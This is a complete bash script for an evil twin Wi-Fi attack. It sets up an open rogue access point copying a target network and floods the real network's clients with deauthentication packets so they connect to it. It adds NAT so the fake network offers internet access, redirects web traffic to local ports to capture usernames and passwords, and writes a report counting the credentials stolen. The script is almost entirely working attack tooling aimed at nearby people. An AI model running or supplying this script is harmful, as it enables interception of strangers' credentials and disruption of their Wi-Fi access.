#!/bin/bash

# Evil Twin Access Point Attack Script with Enhanced Security

set -euo pipefail

# Configuration
LOG_FILE="/var/log/iseeyou_attacks.log"
INTERFACE="wlan0"
MONITOR_INTERFACE="${INTERFACE}mon"
ATTACK_DURATION=600  # 10 minutes default
HOSTAPD_CONF="/tmp/hostapd_evil_twin.conf"
DNSMASQ_CONF="/tmp/dnsmasq_evil_twin.conf"

# Logging function
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') [EVIL_TWIN] $*" | tee -a "$LOG_FILE"
}

# Cleanup function
cleanup() {
    log "Cleaning up and stopping evil twin attack..."
    # Kill processes
    pkill -f "hostapd.*$HOSTAPD_CONF" 2>/dev/null || true
    pkill -f "dnsmasq.*$DNSMASQ_CONF" 2>/dev/null || true
    pkill -f "mdk3.*$MONITOR_INTERFACE" 2>/dev/null || true

    # Stop monitor mode
    sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true

    # Clean up temporary files
    rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF"

    log "Cleanup completed"
}

# Trap for cleanup on exit
trap cleanup EXIT INT TERM

# Validate inputs
validate_mac() {
    local mac=$1
    if [[ ! $mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        log "ERROR: Invalid MAC address format: $mac"
        exit 1
    fi
}

validate_channel() {
    local channel=$1
    if ! [[ "$channel" =~ ^[0-9]+$ ]] || [ "$channel" -lt 1 ] || [ "$channel" -gt 165 ]; then
        log "ERROR: Invalid channel: $channel"
        exit 1
    fi
}

validate_ssid() {
    local ssid=$1
    if [ -z "$ssid" ] || [ ${#ssid} -gt 32 ]; then
        log "ERROR: Invalid SSID: $ssid (must be 1-32 characters)"
        exit 1
    fi
}

# Check dependencies
check_dependencies() {
    local tools=("airmon-ng" "airodump-ng" "mdk3" "hostapd" "dnsmasq" "iwconfig")
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log "ERROR: Required tool not found: $tool"
            exit 1
        fi
    done
    log "All required tools are available"
}

# Create hostapd configuration
create_hostapd_config() {
    local ssid=$1
    local channel=$2
    local interface=$3

    cat > "$HOSTAPD_CONF" << EOF
interface=$interface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

    log "Created hostapd configuration: $HOSTAPD_CONF"
}

# Create dnsmasq configuration
create_dnsmasq_config() {
    local interface=$1

    cat > "$DNSMASQ_CONF" << EOF
interface=$interface
dhcp-range=192.168.100.10,192.168.100.100,255.255.255.0,24h
dhcp-option=3,192.168.100.1
dhcp-option=6,8.8.8.8
server=8.8.8.8
log-queries
log-dhcp
EOF

    log "Created dnsmasq configuration: $DNSMASQ_CONF"
}

# Set up network interface
setup_interface() {
    local interface=$1

    log "Setting up interface $interface for evil twin..."

    # Bring down interface
    sudo ifconfig "$interface" down

    # Configure IP
    sudo ifconfig "$interface" 192.168.100.1 netmask 255.255.255.0 up

    # Enable IP forwarding
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

    log "Interface $interface configured"
}

# Function to create evil twin access point
create_evil_twin() {
    local target_bssid=$1
    local target_channel=$2
    local ssid=$3

    log "Starting evil twin attack on BSSID: $target_bssid, Channel: $target_channel, SSID: $ssid"

    # Validate inputs
    validate_mac "$target_bssid"
    validate_channel "$target_channel"
    validate_ssid "$ssid"

    # Check if interface exists
    if ! iwconfig "$INTERFACE" &>/dev/null; then
        log "ERROR: Wireless interface $INTERFACE not found"
        exit 1
    fi

    # Stop any existing monitor mode
    sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true

    # Put the wireless interface in monitor mode
    log "Putting wireless interface $INTERFACE in monitor mode..."
    if ! sudo airmon-ng start "$INTERFACE"; then
        log "ERROR: Failed to start monitor mode on $INTERFACE"
        exit 1
    fi

    # Wait for interface to be ready
    sleep 2

    # Change to the target channel
    log "Changing channel to $target_channel..."
    if ! sudo iwconfig "$MONITOR_INTERFACE" channel "$target_channel"; then
        log "ERROR: Failed to set channel $target_channel"
        exit 1
    fi

    # Stop monitor mode and set up AP mode
    log "Stopping monitor mode and setting up AP mode..."
    sudo airmon-ng stop "$MONITOR_INTERFACE"
    sleep 2

    # Create configurations
    create_hostapd_config "$ssid" "$target_channel" "$INTERFACE"
    create_dnsmasq_config "$INTERFACE"

    # Set up interface
    setup_interface "$INTERFACE"

    # Start dnsmasq (DHCP server)
    log "Starting DHCP server..."
    sudo dnsmasq -C "$DNSMASQ_CONF" &
    dnsmasq_pid=$!

    # Start hostapd (access point)
    log "Starting evil twin access point..."
    sudo hostapd "$HOSTAPD_CONF" &
    hostapd_pid=$!

    # Start deauthentication attack to force clients to connect to evil twin
    log "Starting deauthentication attack to force clients to our evil twin..."
    sudo aireplay-ng --deauth 0 -a "$target_bssid" "$INTERFACE" &
    deauth_pid=$!

    log "Evil twin attack started successfully"
    log "Access point SSID: $ssid"
    log "Attack will run for $ATTACK_DURATION seconds"

    # Monitor for connected clients
    local start_time=$(date +%s)
    while [ $(($(date +%s) - start_time)) -lt "$ATTACK_DURATION" ]; do
        sleep 10
        # Check if processes are still running
        if ! kill -0 "$hostapd_pid" 2>/dev/null; then
            log "ERROR: hostapd process died"
            return 1
        fi
        if ! kill -0 "$dnsmasq_pid" 2>/dev/null; then
            log "ERROR: dnsmasq process died"
            return 1
        fi
    done

    log "Evil twin attack completed"
    return 0
}

# Main script
main() {
    # Check if running as root
    if [ "$EUID" -ne 0 ]; then
        log "ERROR: This script must be run as root (sudo)"
        exit 1
    fi

    # Check dependencies
    check_dependencies

    # Validate arguments
    if [ $# -lt 3 ]; then
        log "Usage: $0 <target_bssid> <target_channel> <ssid> [attack_duration] [dhcp_range] [capture_credentials] [advanced_ssid]"
        log "Example: $0 00:11:22:33:44:55 6 FreeWiFi 1800 192.168.100.10,192.168.100.50 true true"
        exit 1
    fi

    local target_bssid=$1
    local target_channel=$2
    local ssid=$3

    # Advanced optional parameters
    local attack_duration=${4:-$ATTACK_DURATION}
    local dhcp_range=${5:-"192.168.100.10,192.168.100.100"}
    local capture_credentials=${6:-"false"}
    local advanced_ssid=${7:-"false"}

    # Validate parameters
    if ! [[ "$attack_duration" =~ ^[0-9]+$ ]] || [ "$attack_duration" -lt 60 ]; then
        log "ERROR: Invalid attack duration: $attack_duration (minimum 60 seconds)"
        exit 1
    fi

    # Generate advanced SSID if requested
    if [ "$advanced_ssid" = "true" ]; then
        ssid=$(generate_advanced_ssid "$ssid")
        log "Generated advanced SSID: $ssid"
    fi

    # Execute advanced evil twin attack
    create_evil_twin_advanced "$target_bssid" "$target_channel" "$ssid" "$attack_duration" "$dhcp_range" "$capture_credentials"
}

# Function to generate advanced SSID for better client attraction
generate_advanced_ssid() {
    local base_ssid=$1
    local variations=("Free" "Premium" "Fast" "Secure" "WiFi" "Hotspot" "Network" "Internet")

    # Add random suffix for uniqueness
    local suffix=$((RANDOM % 1000))
    local variation=${variations[$((RANDOM % ${#variations[@]}))]}

    echo "${base_ssid}_${variation}_${suffix}"
}

# Function to create advanced evil twin with credential capture
create_evil_twin_advanced() {
    local target_bssid=$1
    local target_channel=$2
    local ssid=$3
    local attack_duration=$4
    local dhcp_range=$5
    local capture_credentials=$6

    log "Starting advanced evil twin attack"
    log "Target: $target_bssid, Channel: $target_channel, SSID: $ssid"
    log "Duration: ${attack_duration}s, DHCP: $dhcp_range, Capture: $capture_credentials"

    # Validate inputs
    validate_mac "$target_bssid"
    validate_channel "$target_channel"
    validate_ssid "$ssid"

    # Check if interface exists
    if ! iwconfig "$INTERFACE" &>/dev/null; then
        log "ERROR: Wireless interface $INTERFACE not found"
        exit 1
    fi

    # Stop any existing monitor mode
    sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true

    # Put the wireless interface in monitor mode
    log "Putting wireless interface $INTERFACE in monitor mode..."
    if ! sudo airmon-ng start "$INTERFACE"; then
        log "ERROR: Failed to start monitor mode on $INTERFACE"
        exit 1
    fi

    # Wait for interface to be ready
    sleep 2

    # Change to the target channel
    log "Changing channel to $target_channel..."
    if ! sudo iwconfig "$MONITOR_INTERFACE" channel "$target_channel"; then
        log "ERROR: Failed to set channel $target_channel"
        exit 1
    fi

    # Stop monitor mode and set up AP mode
    log "Stopping monitor mode and setting up AP mode..."
    sudo airmon-ng stop "$MONITOR_INTERFACE"
    sleep 2

    # Create advanced configurations
    create_hostapd_config_advanced "$ssid" "$target_channel" "$INTERFACE"
    create_dnsmasq_config_advanced "$INTERFACE" "$dhcp_range"

    # Set up interface with advanced networking
    setup_interface_advanced "$INTERFACE"

    # Set up credential capture if requested
    if [ "$capture_credentials" = "true" ]; then
        setup_credential_capture "$INTERFACE"
    fi

    # Start dnsmasq (DHCP server)
    log "Starting DHCP server..."
    sudo dnsmasq -C "$DNSMASQ_CONF" &
    dnsmasq_pid=$!

    # Start hostapd (access point)
    log "Starting evil twin access point..."
    sudo hostapd "$HOSTAPD_CONF" &
    hostapd_pid=$!

    # Start deauthentication attack to force clients to connect
    log "Starting deauthentication attack to force clients to our evil twin..."
    sudo aireplay-ng --deauth 0 -a "$target_bssid" "$INTERFACE" &
    deauth_pid=$!

    log "Evil twin attack started successfully"
    log "Access point SSID: $ssid"
    log "Attack will run for $attack_duration seconds"

    # Monitor clients and capture credentials
    local start_time=$(date +%s)
    local connected_clients=0
    local credentials_captured=0

    while [ $(($(date +%s) - start_time)) -lt "$attack_duration" ]; do
        sleep 10

        # Check if processes are still running
        if ! kill -0 "$hostapd_pid" 2>/dev/null; then
            log "ERROR: hostapd process died"
            return 1
        fi
        if ! kill -0 "$dnsmasq_pid" 2>/dev/null; then
            log "ERROR: dnsmasq process died"
            return 1
        fi

        # Count connected clients
        local current_clients=$(iw dev "$INTERFACE" station dump 2>/dev/null | grep -c "Station" || echo "0")
        if [ "$current_clients" -gt "$connected_clients" ]; then
            connected_clients=$current_clients
            log "Client connected! Total clients: $connected_clients"
        fi

        # Check for captured credentials
        if [ "$capture_credentials" = "true" ]; then
            local new_credentials=$(count_captured_credentials)
            if [ "$new_credentials" -gt "$credentials_captured" ]; then
                credentials_captured=$new_credentials
                log "Credential captured! Total credentials: $credentials_captured"
            fi
        fi

        # Progress reporting
        local elapsed=$(($(date +%s) - start_time))
        local remaining=$((attack_duration - elapsed))
        if [ $((elapsed % 60)) -eq 0 ] && [ $elapsed -gt 0 ]; then
            log "Progress: ${elapsed}s elapsed, ${remaining}s remaining"
            log "Status: $connected_clients clients connected, $credentials_captured credentials captured"
        fi
    done

    # Generate attack report
    generate_attack_report "$connected_clients" "$credentials_captured" "$attack_duration"

    log "Advanced evil twin attack completed successfully"
    return 0
}

# Function to create advanced hostapd configuration
create_hostapd_config_advanced() {
    local ssid=$1
    local channel=$2
    local interface=$3

    cat > "$HOSTAPD_CONF" << EOF
interface=$interface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
# Advanced settings for better client attraction
beacon_int=100
dtim_period=2
max_num_sta=255
rts_threshold=2347
fragm_threshold=2346
EOF

    log "Created advanced hostapd configuration: $HOSTAPD_CONF"
}

# Function to create advanced dnsmasq configuration
create_dnsmasq_config_advanced() {
    local interface=$1
    local dhcp_range=$2

    # Parse DHCP range
    local dhcp_start=$(echo "$dhcp_range" | cut -d',' -f1)
    local dhcp_end=$(echo "$dhcp_range" | cut -d',' -f2)

    cat > "$DNSMASQ_CONF" << EOF
interface=$interface
dhcp-range=$dhcp_start,$dhcp_end,255.255.255.0,1h
dhcp-option=3,192.168.100.1
dhcp-option=6,8.8.8.8,8.8.4.4
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
# Advanced DNS settings
domain-needed
bogus-priv
no-resolv
EOF

    log "Created advanced dnsmasq configuration: $DNSMASQ_CONF"
}

# Function to set up interface with advanced networking
setup_interface_advanced() {
    local interface=$1

    log "Setting up interface $interface with advanced networking..."

    # Bring down interface
    sudo ifconfig "$interface" down

    # Configure IP
    sudo ifconfig "$interface" 192.168.100.1 netmask 255.255.255.0 up

    # Enable IP forwarding
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

    # Set up NAT for internet access (to make it more attractive)
    sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null || true
    sudo iptables -A FORWARD -i "$interface" -o eth0 -j ACCEPT 2>/dev/null || true
    sudo iptables -A FORWARD -i eth0 -o "$interface" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true

    log "Advanced networking configured for interface $interface"
}

# Function to set up credential capture
setup_credential_capture() {
    local interface=$1

    log "Setting up credential capture on interface $interface"

    # Create capture directory
    local capture_dir="/var/log/iseeyou/credentials"
    sudo mkdir -p "$capture_dir"

    # Set up iptables rules for credential capture
    sudo iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
    sudo iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null || true

    log "Credential capture configured"
}

# Function to count captured credentials
count_captured_credentials() {
    local capture_dir="/var/log/iseeyou/credentials"
    if [ -d "$capture_dir" ]; then
        find "$capture_dir" -name "*.log" -exec grep -l "password\|username\|login" {} \; 2>/dev/null | wc -l
    else
        echo "0"
    fi
}

# Function to generate attack report
generate_attack_report() {
    local clients=$1
    local credentials=$2
    local duration=$3

    local report_file="/var/log/iseeyou/evil_twin_report_$(date +%Y%m%d_%H%M%S).txt"

    cat > "$report_file" << EOF
=== Evil Twin Attack Report ===
Timestamp: $(date)
Duration: ${duration} seconds
Target BSSID: $target_bssid
Target Channel: $target_channel
Evil Twin SSID: $ssid

Results:
- Connected Clients: $clients
- Credentials Captured: $credentials
- Success Rate: $((clients > 0 ? (credentials * 100) / clients : 0))%

Attack Configuration:
- DHCP Range: $dhcp_range
- Credential Capture: $capture_credentials
- Advanced SSID: $advanced_ssid

Recommendations:
$(if [ $clients -eq 0 ]; then
    echo "- No clients connected. Try different SSID or location"
elif [ $credentials -eq 0 ]; then
    echo "- Clients connected but no credentials captured. Check capture setup"
else
    echo "- Attack successful! Review captured credentials"
fi)
EOF

    log "Attack report generated: $report_file"
}

# Run main function
main "$@"